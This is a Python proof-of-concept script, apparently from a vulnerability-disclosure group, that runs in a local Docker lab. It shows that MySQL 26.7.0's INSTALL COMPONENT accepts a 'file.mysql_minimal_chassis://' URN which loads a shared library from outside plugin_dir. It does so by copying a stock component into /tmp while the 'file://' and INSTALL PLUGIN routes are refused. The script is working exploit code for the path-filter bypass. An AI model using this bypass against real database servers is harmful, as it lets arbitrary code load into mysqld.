#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: mysql-install-component-scheme (High: 7.2)
#  Vendor: MySQL Community Server (Oracle)
#  Versions: mysqld 26.7.0 INSTALL COMPONENT
#  Impact: file.mysql_minimal_chassis URN dlopens a component outside plugin_dir
#  Requires: mysql:26.7.0 loopback; INSTALL COMPONENT; stock unused component .so
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "mysql-install-component-scheme"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove INSTALL COMPONENT file.mysql_minimal_chassis skips plugin_dir on mysql 26.7.0."""

import os
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import NoReturn

import pymysql
from pymysql.connections import Connection
from pymysql.cursors import Cursor

LABEL = "mysql-install-component-scheme"
WITNESS = "MYSQL-INSTALL-COMPONENT-SCHEME-WITNESS"
IMAGE_TAG = "mysql:26.7.0"
HOST = "127.0.0.1"
PORT = 18650
MYSQL_USER = "root"
MYSQL_PASSWORD = "labroot"
MYSQL_DATABASE = "lab"
EXPECTED_VERSION = "26.7.0"
COMPOSE_SERVICE = "mysql"
COMPONENT_TABLE_SQL = (
    "SELECT component_id, component_group_id, component_urn FROM mysql.component"
)
URN_SCHEME = "file.mysql_minimal_chassis"
PREFERRED_COMPONENTS: tuple[str, ...] = (
    "component_query_attributes.so",
    "component_audit_api_message_emit.so",
    "component_validate_password.so",
    "component_log_filter_dragnet.so",
    "component_mysqlbackup.so",
)


@dataclass(frozen=True)
class LabConfig:
    label: str
    witness: str
    image: str
    host: str
    port: int
    user: str
    password: str
    database: str
    compose_project: str
    lab_dir: Path
    copy_stem: str
    copy_so: str

    @classmethod
    def from_env(cls) -> "LabConfig":
        copy_stem = f"/tmp/{WITNESS}"
        return cls(
            label=LABEL,
            witness=WITNESS,
            image=IMAGE_TAG,
            host=HOST,
            port=PORT,
            user=MYSQL_USER,
            password=MYSQL_PASSWORD,
            database=MYSQL_DATABASE,
            compose_project=os.environ.get("COMPOSE_PROJECT_NAME", LABEL),
            lab_dir=Path(__file__).resolve().parent,
            copy_stem=copy_stem,
            copy_so=f"{copy_stem}.so",
        )


@dataclass(frozen=True)
class SqlResult:
    ok: bool
    errno: int | None
    message: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> NoReturn:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def compose(
    cfg: LabConfig, *args: str, timeout: int = 60
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", cfg.compose_project, *args],
        cwd=cfg.lab_dir,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def compose_ok(cfg: LabConfig, *args: str, timeout: int = 60) -> str:
    proc = compose(cfg, *args, timeout=timeout)
    out = (proc.stdout or "").strip()
    err = (proc.stderr or "").strip()
    if proc.returncode != 0:
        fail(
            f"compose-exec-failed args={args!r} rc={proc.returncode} "
            f"err={err!r} out={out!r}"
        )
    return out


def connect(cfg: LabConfig) -> Connection:
    return pymysql.connect(
        host=cfg.host,
        port=cfg.port,
        user=cfg.user,
        password=cfg.password,
        database=cfg.database,
        autocommit=True,
        charset="utf8mb4",
        connect_timeout=10,
        read_timeout=30,
        write_timeout=30,
    )


def open_root(cfg: LabConfig) -> Connection:
    try:
        return connect(cfg)
    except pymysql.Error as exc:
        fail(f"root-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")


def fetch_one(cursor: Cursor, sql: str) -> object | None:
    cursor.execute(sql)
    row = cursor.fetchone()
    return None if row is None else row[0]


def fetch_all(cursor: Cursor, sql: str) -> list[tuple[object, ...]]:
    cursor.execute(sql)
    return list(cursor.fetchall())


def sql_try(cursor: Cursor, sql: str) -> SqlResult:
    try:
        cursor.execute(sql)
        return SqlResult(True, None, "ok")
    except pymysql.Error as exc:
        errno = exc.args[0] if exc.args else None
        msg = exc.args[1] if len(exc.args) > 1 else str(exc)
        return SqlResult(False, errno, str(msg))


def install_component(cursor: Cursor, urn: str) -> SqlResult:
    return sql_try(cursor, f"INSTALL COMPONENT '{urn}'")


def uninstall_component(cursor: Cursor, urn: str) -> SqlResult:
    return sql_try(cursor, f"UNINSTALL COMPONENT '{urn}'")


def component_rows(cursor: Cursor) -> list[tuple[object, ...]]:
    return fetch_all(cursor, COMPONENT_TABLE_SQL)


def component_urns(rows: list[tuple[object, ...]]) -> list[str]:
    return [str(row[2]) for row in rows]


def list_plugin_sos(cfg: LabConfig, plugin_dir: str) -> list[str]:
    listing = compose_ok(cfg, "exec", "-T", COMPOSE_SERVICE, "ls", "-1", plugin_dir)
    names: list[str] = []
    for line in listing.splitlines():
        name = line.strip()
        if name.endswith(".so"):
            names.append(name)
    return names


def already_loaded_names(urns: list[str]) -> set[str]:
    loaded: set[str] = set()
    for urn in urns:
        text = str(urn)
        base = text.rsplit("/", 1)[-1]
        if base.endswith(".so"):
            base = base[: -len(".so")]
        loaded.add(base)
        loaded.add(base + ".so")
    return loaded


def pick_source_so(plugin_dir: str, names: list[str], loaded: set[str]) -> str:
    available: list[str] = []
    for name in names:
        if not name.startswith("component_"):
            continue
        stem = name[: -len(".so")] if name.endswith(".so") else name
        if name in loaded or stem in loaded:
            log(f"skip-already-loaded {name}")
            continue
        available.append(name)
    if not available:
        fail(f"no-unused-component-so plugin_dir={plugin_dir!r} names={names!r}")
    for pref in PREFERRED_COMPONENTS:
        if pref in available:
            return pref
    return available[0]


def copy_so(cfg: LabConfig, src: str) -> None:
    compose_ok(
        cfg, "exec", "-T", "-u", "0", COMPOSE_SERVICE, "cp", "-f", src, cfg.copy_so
    )
    compose_ok(
        cfg, "exec", "-T", "-u", "0", COMPOSE_SERVICE, "chmod", "755", cfg.copy_so
    )
    listing = compose_ok(cfg, "exec", "-T", COMPOSE_SERVICE, "ls", "-l", cfg.copy_so)
    log(f"copied-so src={src!r} dest={cfg.copy_so!r} ls={listing!r}")


def read_server_identity(cursor: Cursor) -> tuple[str, str]:
    version = str(fetch_one(cursor, "SELECT VERSION()") or "")
    plugin_dir = str(fetch_one(cursor, "SELECT @@plugin_dir") or "").rstrip("/")
    log(f"mysqld-version={version!r}")
    log(f"plugin_dir={plugin_dir!r}")
    if EXPECTED_VERSION not in version:
        fail(f"version-mismatch version={version!r} image={IMAGE_TAG}")
    if not plugin_dir:
        fail("plugin-dir-empty")
    return version, plugin_dir


def stage_unused_component(
    cfg: LabConfig, plugin_dir: str, loaded_urns: list[str]
) -> str:
    names = list_plugin_sos(cfg, plugin_dir)
    log(f"plugin-dir-sos={names!r}")
    source_name = pick_source_so(
        plugin_dir, names, already_loaded_names(loaded_urns)
    )
    source_path = f"{plugin_dir}/{source_name}"
    log(f"source-so={source_path!r}")
    copy_so(cfg, source_path)
    return source_path


def prove_file_slash_denied(cursor: Cursor, cfg: LabConfig) -> SqlResult:
    # Default file:// is wrapped by mysql_server_path_filter (errno 3529).
    filtered_sql = f"INSTALL COMPONENT 'file://{cfg.copy_stem}'"
    result = sql_try(cursor, filtered_sql)
    log(
        f"filtered-file-slash ok={result.ok} errno={result.errno} "
        f"msg={result.message!r} sql={filtered_sql!r}"
    )
    if result.ok:
        fail("file-slash-allowed expected-denied")
    return result


def prove_install_plugin_denied(cursor: Cursor, cfg: LabConfig) -> SqlResult:
    # INSTALL PLUGIN / CREATE FUNCTION SONAME still reject a slash (errno 1124).
    plugin_sql = f"INSTALL PLUGIN lab_scheme SONAME '{cfg.copy_so}'"
    result = sql_try(cursor, plugin_sql)
    log(
        f"install-plugin-path ok={result.ok} errno={result.errno} "
        f"msg={result.message!r} sql={plugin_sql!r}"
    )
    if result.ok:
        fail("install-plugin-path-allowed expected-denied")
    return result


def load_qualified_urn(cursor: Cursor, cfg: LabConfig) -> tuple[str, SqlResult]:
    # 3-slash URN: scheme:// + /tmp/WITNESS. Loader appends .so; omit the suffix.
    urn_primary = f"{URN_SCHEME}://{cfg.copy_stem}"
    # 4-slash is fallback only.
    urn_extra = f"{URN_SCHEME}:///{cfg.copy_stem}"
    result = install_component(cursor, urn_primary)
    used_urn = urn_primary
    log(
        f"qualified-3slash ok={result.ok} errno={result.errno} "
        f"msg={result.message!r} urn={urn_primary!r}"
    )
    if not result.ok:
        extra = install_component(cursor, urn_extra)
        log(
            f"qualified-4slash ok={extra.ok} errno={extra.errno} "
            f"msg={extra.message!r} urn={urn_extra!r}"
        )
        result = extra
        used_urn = urn_extra
    if not result.ok:
        fail(
            f"qualified-load-denied errno={result.errno} msg={result.message!r} "
            f"urn={used_urn!r}"
        )
    log(f"qualified-load-ok urn={used_urn!r}")
    return used_urn, result


def prove_second_install_rejected(cursor: Cursor, used_urn: str) -> SqlResult:
    result = install_component(cursor, used_urn)
    log(
        f"second-install ok={result.ok} errno={result.errno} msg={result.message!r}"
    )
    if result.ok:
        fail("second-install-allowed expected-already-loaded")
    return result


def prove_uninstall_reinstall(
    cursor: Cursor, used_urn: str
) -> list[tuple[object, ...]]:
    removed = uninstall_component(cursor, used_urn)
    log(f"uninstall ok={removed.ok} errno={removed.errno} msg={removed.message!r}")
    if not removed.ok:
        fail(f"uninstall-failed errno={removed.errno} msg={removed.message!r}")
    reinstalled = install_component(cursor, used_urn)
    log(
        f"reinstall-after-uninstall ok={reinstalled.ok} errno={reinstalled.errno} "
        f"msg={reinstalled.message!r}"
    )
    if not reinstalled.ok:
        fail(
            f"reinstall-failed errno={reinstalled.errno} msg={reinstalled.message!r}"
        )
    final_rows = component_rows(cursor)
    log(f"mysql.component-final={final_rows!r}")
    if used_urn not in component_urns(final_rows):
        fail(f"component-urn-missing-after-reinstall rows={final_rows!r}")
    return final_rows


def report_success(
    cfg: LabConfig,
    plugin_dir: str,
    source_path: str,
    filtered: SqlResult,
    plugin: SqlResult,
    loaded: SqlResult,
    used_urn: str,
    final_rows: list[tuple[object, ...]],
    version: str,
) -> None:
    log(
        f"IOC plugin_dir={plugin_dir} copied={cfg.copy_so} source={source_path} "
        f"filtered-errno={filtered.errno} plugin-errno={plugin.errno} "
        f"qualified-errno={loaded.errno} qualified-urn={used_urn} "
        f"component-row={final_rows!r} version={version}"
    )
    log(
        f"SUCCESS {cfg.label} file-slash-denied=yes qualified-load=yes "
        f"component-urn=yes dump=26.7.0 image={cfg.image} {cfg.witness}"
    )


def main() -> None:
    cfg = LabConfig.from_env()
    log(f"lab={cfg.label} image={cfg.image} host={cfg.host} port={cfg.port}")
    conn = open_root(cfg)
    with conn:
        cursor = conn.cursor()
        version, plugin_dir = read_server_identity(cursor)

        before_rows = component_rows(cursor)
        log(f"mysql.component-before={before_rows!r}")
        source_path = stage_unused_component(
            cfg, plugin_dir, component_urns(before_rows)
        )

        filtered = prove_file_slash_denied(cursor, cfg)
        plugin = prove_install_plugin_denied(cursor, cfg)
        used_urn, loaded = load_qualified_urn(cursor, cfg)

        after_rows = component_rows(cursor)
        log(f"mysql.component-after={after_rows!r}")
        if used_urn not in component_urns(after_rows):
            fail(f"component-urn-missing rows={after_rows!r} expected={used_urn!r}")

        prove_second_install_rejected(cursor, used_urn)
        final_rows = prove_uninstall_reinstall(cursor, used_urn)
        report_success(
            cfg,
            plugin_dir,
            source_path,
            filtered,
            plugin,
            loaded,
            used_urn,
            final_rows,
            version,
        )
        cursor.close()


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"exception={type(exc).__name__}:{exc}")

